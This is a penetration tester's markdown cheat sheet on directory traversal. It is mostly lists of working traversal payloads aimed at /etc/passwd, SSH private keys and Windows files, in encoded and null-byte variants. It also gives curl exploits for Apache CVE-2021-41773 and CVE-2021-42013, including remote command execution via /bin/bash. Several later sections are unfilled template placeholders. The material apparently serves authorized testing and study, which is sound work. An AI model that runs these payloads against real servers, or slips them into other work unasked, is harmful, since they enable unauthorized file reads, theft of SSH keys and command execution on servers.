# Description

Directory traversal attack exploits an application to gain unauthorized access to the file system.

# Command Syntax

```bash
/?file=index.php
/?file=index.html
/?file=/etc/passwd
/?file=../../../etc/passwd
/?file=../../../../etc/passwd
/?file=../../../../../etc/passwd
/?file=..//..//..//..//etc/passwd
/?file=....//....//....//etc/passwd
/?file=....//....//....//....//etc/passwd

# URL encode
/?file=..%252f..%252f..%252fetc/passwd
/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# URL double encode
/?file=%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
/?file=/var/www/images/../../../etc/passwd
/?file=/etc/passwd%00.png
/?file=../../../etc/passwd%00.png
/?file=....//....//....//etc/passwd%00.png
/?file=..%252f..%252f..%252fetc/passwd%00.png
/?file=/var/www/images/../../../etc/passwd%00.png

# Hostfile
/?file=/etc/hosts

# SSH keys
/?file=../../../../../home/<username>/.ssh/authorized_keys
/?file=../../../../../home/<username>/.ssh/id_rsa

# Web root in the developer's home
/?file=../../../../home/<username>/app/app.py

# PHP web application
/index.php/../
/index.php/..;/
/index.php/%2e%2e;/

# Windows
/?file=..\..\..\windows\win.ini

```

### Using Curl

If we want to test against the URL path not param, `curl` can be used with the option `--path-as-is`:

```bash
curl --path-as-is http://example.com/../../../../etc/passwd

```

## Apache 2.4.49 (CVE-2021-41773)

```bash
# without CGI enabled
curl -v 'https://example.com/cgi-bin/../../../../../../../../../../etc/passwd'
curl -v 'https://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
curl -v 'https://example.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'

# with CGI enabled
curl -v 'http://example.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"

```

## Apache 2.4.50 (CVE-2021-42013)

```bash
# without CGI enabled
curl -v 'https://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'

# with CGI enabled
curl -v 'https://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"

```

# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When and why you would use this technique?

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[MOC - Initial Access](../../0%20-%20MOCs/MOC%20-%20Initial%20Access.md)

# References

-   [Exploit DB](https://www.exploit-db.com/exploits/50383)
-   [Exploit DB](https://www.exploit-db.com/exploits/50406)